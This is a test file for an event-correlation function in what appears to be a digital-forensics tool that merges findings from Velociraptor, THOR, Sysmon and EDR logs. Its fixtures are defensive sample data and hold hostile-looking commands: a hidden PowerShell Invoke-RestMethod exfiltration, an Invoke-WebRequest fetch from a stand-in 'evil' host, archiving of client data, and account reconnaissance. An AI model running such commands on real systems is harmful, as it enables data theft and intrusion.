import { describe, it, expect } from "vitest";
import { correlateEvents } from "../../src/analysis/correlate.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";

function ev(over: Partial<ForensicEvent> & { id: string }): ForensicEvent {
  return {
    id: over.id, timestamp: "2026-05-26T12:00:00Z", description: "event", severity: "High",
    mitreTechniques: [], relatedFindingIds: [], sourceScreenshots: [], ...over,
  };
}

describe("correlateEvents", () => {
  it("merges a Velociraptor event and a THOR event about the same file (shared hash)", () => {
    const HASH = "4813e753f6f9bfa5c5de0edbb8dd3cc7f1fa51714097d3144d44e5e89dbd33ef";
    const velo = ev({ id: "m1e1", description: `Downloaded file evil.exe flagged, sha256 ${HASH}`,
      severity: "High", sources: ["CSV import"], sourceScreenshots: ["0001_velo.csv"], timestamp: "2026-05-26T08:35:23Z" });
    const thor = ev({ id: "t2e5", description: "THOR Alert [Filescan]: Malware file found — C:\\Tools\\evil.exe",
      severity: "Critical", sha256: HASH, sources: ["THOR"], sourceScreenshots: ["0002_thor.json"], timestamp: "2026-05-26T08:35:23Z" });

    const out = correlateEvents([velo, thor]);
    expect(out).toHaveLength(1);                       // one canonical event
    expect(out[0].severity).toBe("Critical");          // most severe wins
    expect(out[0].sources).toEqual(expect.arrayContaining(["CSV import", "THOR"]));
    expect(out[0].sourceScreenshots).toEqual(expect.arrayContaining(["0001_velo.csv", "0002_thor.json"]));
    // Corroboration is conveyed via the sources field, NOT by mutating the description.
    expect(out[0].description).not.toContain("corroborated");
  });

  it("does NOT merge distinct process creations that share an interpreter's image hash", () => {
    // powershell.exe has ONE image hash across every invocation — merging by it would collapse a
    // benign cmdlet, `Compress-Archive` (collection) and `Invoke-RestMethod` (exfil) into one row.
    // Process-creation events (those carrying a pid) correlate by host+pid, not image hash.
    const PSHASH = "5d9d62a6794ccf2b4ed30874273f8666fd353e183b7587ac4c8261edabe6990b";
    const mk = (id: string, pid: number, cmd: string, t: string): ForensicEvent => ev({
      id, description: `Sysmon Process create (EID 1) - powershell.exe - CommandLine=${cmd}`,
      sha256: PSHASH, pid, asset: "FS-01.meridiancpa.com", timestamp: t, sources: ["Sysmon"],
    });
    const out = correlateEvents([
      mk("e1", 1000, "powershell.exe Get-Date", "2024-03-12T15:00:00Z"),
      mk("e2", 9908, "powershell.exe -nop -c Compress-Archive -Path D:\\ClientData\\Tax2023", "2024-03-12T16:15:02Z"),
      mk("e3", 10436, "powershell.exe -nop -w hidden -c Invoke-RestMethod ...", "2024-03-12T17:00:21Z"),
    ]);
    expect(out).toHaveLength(3); // all three survive — distinct activities, not one binary
    expect(out.some((e) => e.description.includes("Compress-Archive"))).toBe(true);
    expect(out.some((e) => e.description.includes("Invoke-RestMethod"))).toBe(true);
  });

  it("never invents 'unknown source' for a source-less event, and self-heals a legacy note", () => {
    // An event from a build before `sources` existed (no sources) merged with a THOR event.
    const legacy = ev({ id: "old", description: "Malware file found — evil.exe [corroborated by 2 sources: unknown source, THOR]",
      sha256: "c".repeat(64), timestamp: "2025-01-01T00:00:00Z" }); // no sources field
    const thor = ev({ id: "new", description: "Malware file found — evil.exe",
      sha256: "c".repeat(64), timestamp: "2025-01-01T00:00:00Z", sources: ["THOR"] });
    const out = correlateEvents([legacy, thor]);
    expect(out).toHaveLength(1);
    expect(out[0].sources).toEqual(["THOR"]);              // only the real source, no "unknown source"
    expect(out[0].description).not.toContain("corroborated"); // legacy note stripped
  });

  it("merges same path within the time window, keeps distinct paths separate", () => {
    const a = ev({ id: "a", description: "m.exe by THOR", path: "c:\\users\\srv\\m.exe", timestamp: "2026-05-26T12:00:00Z", sources: ["THOR"] });
    const b = ev({ id: "b", description: "m.exe by Velo", path: "c:\\users\\srv\\m.exe", timestamp: "2026-05-26T12:00:01Z", sources: ["CSV import"] });
    const c = ev({ id: "c", description: "other.exe", path: "c:\\users\\srv\\other.exe", timestamp: "2026-05-26T12:00:00Z", sources: ["THOR"] });
    const out = correlateEvents([a, b, c], { windowSeconds: 2 });
    expect(out).toHaveLength(2);                        // a+b merge, c separate
    const merged = out.find((e) => e.sources && e.sources.length === 2)!;
    expect(merged.sources).toEqual(expect.arrayContaining(["THOR", "CSV import"]));
  });

  it("merges a process creation seen by the EDR (ECAR) and the Windows log on host+pid", () => {
    // Same process creation, two tools, different wording + no shared hash/path — only the pid links them.
    const ecar = ev({ id: "ec", description: "Process created: powershell.exe -enc … (parent explorer.exe) @ FILE-BO-01",
      asset: "FILE-BO-01", pid: 5292, processName: "powershell.exe", sources: ["EDR (ECAR)"], timestamp: "2024-05-14T13:29:39.632Z" });
    const evtx = ev({ id: "wn", description: "Microsoft-Windows-Sysmon Process Create (EID 1) - FILE-BO-01\\nina.kapoor @ FILE-BO-01",
      asset: "FILE-BO-01", pid: 5292, processName: "powershell.exe", sources: ["Windows Event Log"], timestamp: "2024-05-14T13:29:40.001Z" });
    const out = correlateEvents([ecar, evtx]);
    expect(out).toHaveLength(1);
    expect(out[0].sources).toEqual(expect.arrayContaining(["EDR (ECAR)", "Windows Event Log"]));
    expect(out[0].pid).toBe(5292);
  });

  it("does NOT merge same pid on DIFFERENT hosts, or the same pid reused outside the window", () => {
    const a = ev({ id: "a", description: "create @ A", asset: "HOST-A", pid: 4321, sources: ["EDR (ECAR)"], timestamp: "2024-05-14T13:00:00Z" });
    const b = ev({ id: "b", description: "create @ B", asset: "HOST-B", pid: 4321, sources: ["Windows Event Log"], timestamp: "2024-05-14T13:00:01Z" });
    // Same host + pid but 10 minutes apart (pid recycled) — beyond the 120s window.
    const c = ev({ id: "c", description: "later reuse @ A", asset: "HOST-A", pid: 4321, sources: ["Windows Event Log"], timestamp: "2024-05-14T13:10:00Z" });
    expect(correlateEvents([a, b, c])).toHaveLength(3);
  });

  it("does NOT treat a URL in the description as a shared file path (#102)", () => {
    // Two different Defender detections seconds apart, each message carrying the same Microsoft
    // fwlink URL. The URL must not be read as a filesystem path and collapse them into one.
    const url = "https://go.microsoft.com/fwlink/?linkid=37020&name=HackTool:Win32";
    const a = ev({ id: "a", description: `Antivirus Hacktool Detection — ${url}/Passview&threatid=1`, timestamp: "2026-06-03T08:15:40.382Z" });
    const b = ev({ id: "b", description: `Antivirus Hacktool Detection — ${url}/Mimikatz&threatid=2`, timestamp: "2026-06-03T08:15:40.417Z" });
    expect(correlateEvents([a, b], { windowSeconds: 2 })).toHaveLength(2);
  });

  it("correlates a description path against a STRUCTURED path (AI event ↔ import)", () => {
    const ai = ev({ id: "a", description: "wrote payload to /usr/local/bin/x", path: undefined, timestamp: "2026-06-03T08:00:00Z", sources: ["screenshot"] });
    const imp = ev({ id: "b", description: "THOR finding", path: "/usr/local/bin/x", timestamp: "2026-06-03T08:00:01Z", sources: ["THOR"] });
    expect(correlateEvents([ai, imp], { windowSeconds: 2 })).toHaveLength(1);
  });

  it("does NOT merge two FREE-TEXT path mentions (a shared process exe is too weak) (#102)", () => {
    // Distinct Sysmon Proc-Access detections seconds apart that merely share SrcProc powershell.exe
    // in their text must stay separate — neither carries a structured path.
    const exe = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    const a = ev({ id: "a", description: `Proc Access — SrcProc: ${exe} TgtProc: ${exe} Access: 5136`, path: undefined, timestamp: "2026-06-03T08:41:40.537Z", sources: ["Velociraptor"] });
    const b = ev({ id: "b", description: `Proc Access — SrcProc: ${exe} TgtProc: ${exe} Access: 2097151`, path: undefined, timestamp: "2026-06-03T08:41:40.549Z", sources: ["Velociraptor"] });
    expect(correlateEvents([a, b], { windowSeconds: 2 })).toHaveLength(2);
  });

  it("does NOT collapse distinct same-tool rows that share a container path (#102)", () => {
    // Every PSReadline command shares the history-file OSPath (a structured path) and is undated —
    // but they're distinct commands from one tool, not the same artifact seen twice.
    const hist = "c:\\users\\v\\appdata\\...\\consolehost_history.txt";
    const a = ev({ id: "a", description: "whoami /all", path: hist, timestamp: "", sources: ["Velociraptor"] });
    const b = ev({ id: "b", description: "Invoke-WebRequest http://evil/x", path: hist, timestamp: "", sources: ["Velociraptor"] });
    const c = ev({ id: "c", description: "net user administrator", path: hist, timestamp: "", sources: ["Velociraptor"] });
    expect(correlateEvents([a, b, c])).toHaveLength(3);
  });

  it("does NOT merge same path when timestamps are outside the window", () => {
    const a = ev({ id: "a", path: "c:\\x.exe", timestamp: "2026-05-26T12:00:00Z" });
    const b = ev({ id: "b", path: "c:\\x.exe", timestamp: "2026-05-26T12:05:00Z" }); // 5 min apart
    expect(correlateEvents([a, b], { windowSeconds: 2 })).toHaveLength(2);
  });

  it("extracts a hash from the description text to match a structured event", () => {
    const HASH = "a".repeat(64);
    const fromText = ev({ id: "x", description: `proc spawned, hash=${HASH}` });
    const structured = ev({ id: "y", description: "THOR finding", sha256: HASH });
    expect(correlateEvents([fromText, structured])).toHaveLength(1);
  });

  it("is idempotent — correlating an already-merged result changes nothing", () => {
    const HASH = "b".repeat(64);
    const once = correlateEvents([ev({ id: "a", sha256: HASH, sources: ["THOR"] }), ev({ id: "b", sha256: HASH, sources: ["CSV"] })]);
    const twice = correlateEvents(once);
    expect(twice).toHaveLength(1);
    expect(twice[0].id).toBe(once[0].id);
  });

  it("collapses exact duplicates (same time + description) — the re-imported-file case", () => {
    // Same THOR finding imported 3 times → 3 events with identical time+description but no
    // shared id (different import prefixes). Must collapse to one.
    const dup = (id: string, src: string) => ev({
      id, description: "THOR Notice [Filescan]: Suspicious file found — C:\\Tools\\NirSoft\\lsasecretsdump.exe",
      timestamp: "2009-11-29T10:25:34Z", severity: "Medium", sources: ["THOR"], sourceScreenshots: [src],
    });
    const out = correlateEvents([dup("t4e1", "0004.json"), dup("t5e1", "0005.json"), dup("t6e1", "0006.json")]);
    expect(out).toHaveLength(1);
    expect(out[0].sourceScreenshots).toEqual(expect.arrayContaining(["0004.json", "0005.json", "0006.json"]));
    expect(out[0].sources).toEqual(["THOR"]); // same source, not falsely "3 sources"
  });

  it("leaves unrelated events untouched and in order (ids preserved)", () => {
    const a = ev({ id: "a", description: "phish opened", path: undefined });
    const b = ev({ id: "b", description: "defender disabled", path: undefined });
    const out = correlateEvents([a, b]);
    expect(out.map((e) => e.id)).toEqual(["a", "b"]);
  });

  it("merges undated events on the same path (no time to disprove)", () => {
    const a = ev({ id: "a", path: "c:\\u.exe", timestamp: "", sources: ["THOR"] });
    const b = ev({ id: "b", path: "c:\\u.exe", timestamp: "", sources: ["CSV import"] });
    expect(correlateEvents([a, b])).toHaveLength(1);
  });

  it("does NOT borrow artifactName from a non-primary event — it must match the shown description", () => {
    // mergeGroup picks `primary` by worst-severity then longest-description; `description` always comes
    // from primary. artifactName is an ATTRIBUTION of that description (which artifact produced it), not
    // a neutral shared fact — so it must follow primary too. Regression: a Chainsaw/Sigma detection
    // correlated with a Velociraptor Pstree record sharing host+pid (a genuine cross-tool corroboration,
    // not a same-import duplicate) showed "Generic.System.Pstree" as the origin of a Chainsaw finding,
    // because artifactName fell back to whichever contributing event happened to carry one. Merge is
    // forced by a shared sha256.
    const HASH = "a".repeat(64);
    const a = ev({ id: "e1", description: "Sigma detection: suspicious file creation flagged on the host",
      severity: "High", sha256: HASH, sources: ["Velociraptor"] }); // longer + more severe → primary, NO artifactName
    const b = ev({ id: "e2", description: "MFT: created evil.exe",
      severity: "Info", sha256: HASH, sources: ["Velociraptor"], artifactName: "Windows.NTFS.MFT" });
    const [merged] = correlateEvents([a, b]);
    expect(merged.description).toContain("Sigma detection");
    expect(merged.artifactName).toBeUndefined();
  });

  it("keeps artifactName when primary itself carries one (no cross-event borrowing needed)", () => {
    const HASH = "c".repeat(64);
    const a = ev({ id: "e1", description: "Sigma detection: suspicious file creation flagged on the host",
      severity: "High", sha256: HASH, sources: ["Velociraptor"], artifactName: "Windows.EventLogs.Chainsaw" });
    const b = ev({ id: "e2", description: "MFT: created evil.exe",
      severity: "Info", sha256: HASH, sources: ["Velociraptor"], artifactName: "Windows.NTFS.MFT" });
    const [merged] = correlateEvents([a, b]);
    expect(merged.artifactName).toBe("Windows.EventLogs.Chainsaw");
  });

  it("preserves message + veloUrl from a NON-primary event in a merged group (#8/#9 survive promote)", () => {
    // Same fallback pattern as artifactName: put message/veloUrl on the NON-primary (Info) event so the
    // `...primary` spread alone would drop them — the `events.find(...)` fallback must carry them through.
    const HASH = "b".repeat(64);
    const a = ev({ id: "e1", description: "Sigma detection: suspicious file creation flagged on the host",
      severity: "High", sha256: HASH, sources: ["Velociraptor"] }); // longer + more severe → primary
    const b = ev({ id: "e2", description: "MFT: created evil.exe", severity: "Info", sha256: HASH,
      sources: ["Velociraptor"], message: "FULL rendered event message ".repeat(20),
      veloUrl: "https://velo.example/app/index.html?org_id=root#/hunts/H.ABC" });
    const [merged] = correlateEvents([a, b]);
    expect(merged.message).toContain("FULL rendered event message");
    expect(merged.veloUrl).toBe("https://velo.example/app/index.html?org_id=root#/hunts/H.ABC");
  });

  it("preserves process-chain fields from any event in a merged group", () => {
    const HASH = "d".repeat(64);
    const primary = ev({ id: "a", description: "longer Velociraptor detection text", sha256: HASH, sources: ["Velociraptor"] });
    const withChain = ev({
      id: "b",
      description: "THOR process chain",
      sha256: HASH,
      sources: ["THOR"],
      processName: "powershell.exe",
      parentName: "winword.exe",
      chainCheck: { observed: false, note: "winword.exe -> powershell.exe is unusual", checkedAt: "2026-05-26T12:01:00Z" },
    });

    const out = correlateEvents([primary, withChain]);

    expect(out).toHaveLength(1);
    expect(out[0].processName).toBe("powershell.exe");
    expect(out[0].parentName).toBe("winword.exe");
    expect(out[0].chainCheck?.observed).toBe(false);
  });
});
